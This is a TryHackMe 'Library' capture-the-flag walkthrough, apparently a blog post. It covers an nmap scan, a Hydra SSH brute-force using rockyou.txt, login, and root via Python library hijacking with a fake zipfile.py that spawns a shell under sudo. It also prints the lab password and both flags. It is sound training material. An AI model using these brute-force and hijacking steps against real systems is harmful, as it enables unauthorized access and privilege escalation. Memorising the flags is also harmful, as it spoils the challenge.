@@ -1,0 +1,251 @@
+---
+title: "TryHackMe Writeup: Library"
+author: Guru Brian
+pubDatetime: 2026-08-03T07:31:14.159Z
+slug: 
+featured: false
+tags:
+  - Library
+  - TryHackMe
+  - Privilege Escalation
+  - CTF
+description: Learn the mechanics of Python Library Hijacking in this TryHackMe Library walkthrough. We cover initial web enumeration, Hydra password attacks, and root privilege escalation.
+hideEditPost: false
+---
+
+Welcome to my writeup for the TryHackMe "Library" room! This beginner-friendly Linux machine is a fantastic playground for practicing fundamental penetration testing skills. It covers basic web enumeration, password brute-forcing, and a classic, highly practical privilege escalation technique: Python Library Hijacking.
+
+Here is the step-by-step breakdown of how to conquer this room.
+
+## Table of contents
+
+## Initial Reconnaissance
+
+As always, we begin by deploying the target machine and scanning for open ports and running services using `nmap`.
+
+```bash
+❯ nmap -p- -sC -sV -vv -T5 -Pn 10.10.185.175
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 08:39 EDT
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:39
+Completed NSE at 08:39, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:39
+Completed NSE at 08:39, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:39
+Completed NSE at 08:39, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 08:39
+Completed Parallel DNS resolution of 1 host. at 08:39, 0.04s elapsed
+Initiating SYN Stealth Scan at 08:39
+Scanning 10.10.185.175 [65535 ports]
+Discovered open port 80/tcp on 10.10.185.175
+Discovered open port 22/tcp on 10.10.185.175
+Increasing send delay for 10.10.185.175 from 0 to 5 due to 263 out of 657 dropped probes since last increase.
+Warning: 10.10.185.175 giving up on port because retransmission cap hit (2).
+SYN Stealth Scan Timing: About 7.96% done; ETC: 08:46 (0:05:58 remaining)
+SYN Stealth Scan Timing: About 12.93% done; ETC: 08:47 (0:06:51 remaining)
+SYN Stealth Scan Timing: About 20.52% done; ETC: 08:47 (0:05:53 remaining)
+SYN Stealth Scan Timing: About 27.29% done; ETC: 08:47 (0:05:30 remaining)
+SYN Stealth Scan Timing: About 34.65% done; ETC: 08:47 (0:04:50 remaining)
+SYN Stealth Scan Timing: About 41.78% done; ETC: 08:47 (0:04:16 remaining)
+SYN Stealth Scan Timing: About 48.97% done; ETC: 08:47 (0:03:43 remaining)
+SYN Stealth Scan Timing: About 55.83% done; ETC: 08:47 (0:03:13 remaining)
+SYN Stealth Scan Timing: About 61.99% done; ETC: 08:47 (0:02:48 remaining)
+SYN Stealth Scan Timing: About 67.96% done; ETC: 08:47 (0:02:25 remaining)
+SYN Stealth Scan Timing: About 73.44% done; ETC: 08:47 (0:02:02 remaining)
+SYN Stealth Scan Timing: About 79.38% done; ETC: 08:47 (0:01:36 remaining)
+SYN Stealth Scan Timing: About 86.86% done; ETC: 08:47 (0:01:00 remaining)
+Completed SYN Stealth Scan at 08:48, 510.21s elapsed (65535 total ports)
+Initiating Service scan at 08:48
+Scanning 2 services on 10.10.185.175
+Completed Service scan at 08:48, 6.49s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.185.175.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 6.14s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 0.81s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 0.00s elapsed
+Nmap scan report for 10.10.185.175
+Host is up, received user-set (0.17s latency).
+Scanned at 2025-08-10 08:39:46 EDT for 524s
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE    SERVICE REASON         VERSION
+22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/X/Zd2/Rc7PrxR+K9bGX9i7Imk3JlU274UsMqM6X03THehc6XUvg0URMryl9IldYLjQvD0fadIg1jB8rCxqzRiJi35nw7ICUXnpZryDS/guLb94Sb9IrLWBTNNdUWV7bTb4gMaGHdyQAmKY62FgL2aKUFMn8SpxJu0WiVIQgcKkv15s17rNqVD39kG8x/bfdftcjn/YtEP09Sy4z1FqXF9FT1xWKaVr3Pd5rCAU4rpOzVpS+qTj77NWaXNDlcg3aCRaILD+4lquq8kVAA+VcXR9IwXOTKJRzRCMfYwd3M6QC45LlRa17xvhI++vBtCcGwxuD9JZsXu0Cd/5fdisrl
+|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI8Oi4FyiWylek0a1n1TD1/TBOi2uXVPfqoSo1C56D1rJlv4g2g6SDJjW29bhodoVO6W8VdWNQGiyJ5QW2XirHI=
+|   256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOPQQrT4KT/PF+8i33LGgs0c83MQL1m863niSGsBDfCN
+80/tcp    open     http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to  Blog - Library Machine
+| http-robots.txt: 1 disallowed entry
+|_/
+41592/tcp filtered unknown no-response
+63733/tcp filtered unknown no-response
+64036/tcp filtered unknown no-response
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:48
+Completed NSE at 08:48, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 523.99 seconds
+           Raw packets sent: 73778 (3.246MB) | Rcvd: 68730 (2.754MB)
+```
+
+The scan reveals two open ports:
+
+- Port 22: SSH (OpenSSH 7.2p2)
+
+- Port 80: HTTP (Apache 2.4.18)
+
+## Web Enumeration
+
+When we visit the web page on *port 80*, it appears to be a simple blog. The most interesting piece of information on the homepage is the name of the blog publisher: `meliodas`. This gives us a potential username.
+
+Our Nmap scan also pointed out a `robots.txt` file with one disallowed entry. Upon inspecting it, we notice something highly suspicious: a User-Agent string containing the word `rockyou`.
+
+> \[!NOTE]
+> This is a massive hint! It suggests we should try brute-forcing SSH credentials for the user `meliodas` using the famous `rockyou.txt` wordlist.
+
+## Gaining a Foothold
+
+Armed with a username (`meliodas`) and a wordlist hint (`rockyou.txt`), we fire up Hydra to attack the SSH service.
+
+```bash
+❯ hydra -t 64 -f -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.80.224
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-10 11:38:51
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://10.10.80.224:22/
+[22][ssh] host: 10.10.80.224   login: meliodas   password: iloveyou1
+[STATUS] attack finished for 10.10.80.224 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-10 11:39:14
+```
+
+Hydra quickly finds a valid password: `iloveyou1`.
+
+With these credentials, we can SSH into the machine and grab our first flag:
+
+```bash
+❯ ssh meliodas@10.10.80.224
+The authenticity of host '10.10.80.224 (10.10.80.224)' can't be established.
+ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.80.224' (ED25519) to the list of known hosts.
+meliodas@10.10.80.224's password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
+meliodas@ubuntu:~$ ls
+bak.py  user.txt
+meliodas@ubuntu:~$ cat user.txt
+6d488cbb3f111d135722c33cb635f4ec
+```
+
+## Privilege escalation
+
+Now that we have initial access, our next goal is `root`. Performing a long listing (`ls -la`), we can see a file named `bak.py` in our home directory owned by `root`.
+
+Let's check our sudo privileges to see what our user is allowed to do.
+
+```bash
+meliodas@ubuntu:~$ sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+```
+
+Excellent! We can run *bak.py* using Python as root, without needing a password. Let's inspect the contents of the script.
+
+```bash
+meliodas@ubuntu:~$ cat bak.py
+#!/usr/bin/env python
+import os
+import zipfile
+
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+if __name__ == '__main__':
+    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipdir('/var/www/html', zipf)
+    zipf.close()
+```
+
+*Understanding Python Library Hijacking*
+
+The script imports standard libraries: `os` and `zipfile`. Because we can run this script as root, we might be able to overwrite the file with a Python reverse shell. However, an even stealthier and highly effective privilege escalation method is *Python Library Hijacking*.
+
+To understand how this works, we need to look at the order in which Python searches for modules to load (`sys.path`).
+
+```bash
+meliodas@ubuntu:~$ python3 -c 'import sys; print("\n".join(sys.path))'
+
+/usr/lib/python35.zip
+/usr/lib/python3.5
+/usr/lib/python3.5/plat-x86_64-linux-gnu
+/usr/lib/python3.5/lib-dynload
+/usr/local/lib/python3.5/dist-packages
+/usr/lib/python3/dist-packages
+```
+
+> \[!TIP]+ Mentor's tip
+> Notice the empty blank line at the very top of the output? That empty space represents the current working directory. Because it is checked first, if we create a malicious file in our current directory named after one of the imported libraries (`like zipfile.py`), Python will execute our malicious file instead of the legitimate system library!
+
+*Executing the Hijack*
+
+We create a fake `zipfile.py` in the same directory as `bak.py`. Inside, we place a simple payload to drop us into a shell:
+
+```python
+import os
+os.system("/bin/sh")
+```
+Now, we simply execute the backup script using our sudo privileges. When the script tries to run import *zipfile*, it will load our malicious file instead, executing */bin/sh* as root!
+
+```bash
+meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
+# ls
+bak.py  __pycache__  user.txt  zipfile.py
+# cd /root
+# ls
+root.txt
+# cat root.txt
+e8c8c6c256c35515d1d344ee0488c617
+```
+We are *root*! 
+
+> \[!SUCCESS]
+> We successfully hijacked the module import to spawn a privileged shell and grab the final flag.
